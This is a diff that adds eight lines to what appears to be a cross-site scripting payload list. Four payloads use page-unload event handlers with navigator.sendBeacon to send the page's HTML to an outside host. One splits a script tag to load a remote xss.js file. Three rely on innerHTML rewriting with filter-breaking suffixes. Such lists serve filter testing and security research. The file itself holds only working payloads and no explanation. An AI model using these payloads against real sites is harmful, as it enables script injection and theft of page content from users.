@@ -1,0 +1,8 @@
+<body onbeforeunload=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>
+<body onpagehide=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>
+<body onunload=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>
+<svg onunload=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<script>d.innerHTML+='';</script>
+<script>d.innerHTML+='';</script>//["'`-->]]>]</div>
+<script>with(document.getElementById("d"))innerHTML=innerHTML</script>//["'`-->]]>]</div>
